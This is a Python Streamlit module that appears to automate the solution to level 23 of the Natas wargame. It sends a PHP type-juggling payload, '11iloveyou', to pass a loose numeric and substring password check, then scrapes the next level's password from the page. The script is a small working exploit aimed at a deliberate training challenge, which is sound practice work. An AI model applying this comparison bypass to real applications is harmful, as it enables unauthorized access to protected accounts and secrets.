import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting PHP Numeric Type Juggling & Substring Matching Vulnerabilities...")
    
    # 1. Safely extract credentials without throwing a KeyError
    username = "natas23"
    
    # Try multiple common key names from your dashboard context dictionary
    current_password = (
        context.get('password') or 
        context.get('current_password') or 
        context.get('lvl22_password') or 
        ""
    ).strip()
    
    session.auth = (username, current_password)
    
    # 2. Craft the exploit payload mixing leading digits with required sub-string markers
    payload_data = {"passwd": "11iloveyou"}
    st.write(f"📡 Sending parameter payload: `{payload_data}`")
    
    try:
        # Transmit target parameters via POST
        response = session.post(base_url, data=payload_data, timeout=10)
        
        # 3. Process response text for secret token content
        if "The password for natas24 is" in response.text:
            st.success("🎯 PHP loose comparison condition bypassed successfully!")
            
            # Find all 32/64 character alphanumeric strings on the page
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
            new_tokens = [t for t in all_tokens if t != current_password]
            
            if new_tokens:
                st.success("🎯 Level 23 challenge resolved successfully!")
                st.code(f"Natas 24 Password: {new_tokens[0]}")
            else:
                st.warning("Exploit worked, but no unique password string pattern matched our filters.")
                with st.expander("Examine Page Content Output"):
                    st.code(response.text, language="html")
        else:
            st.error("The server rejected the payload alignment. Verify your input credentials match Level 22.")
            with st.expander("Examine Page Response State"):
                st.code(response.text, language="html")
                
    except Exception as e:
        st.error(f"Execution failed due to programmatic error: {str(e)}")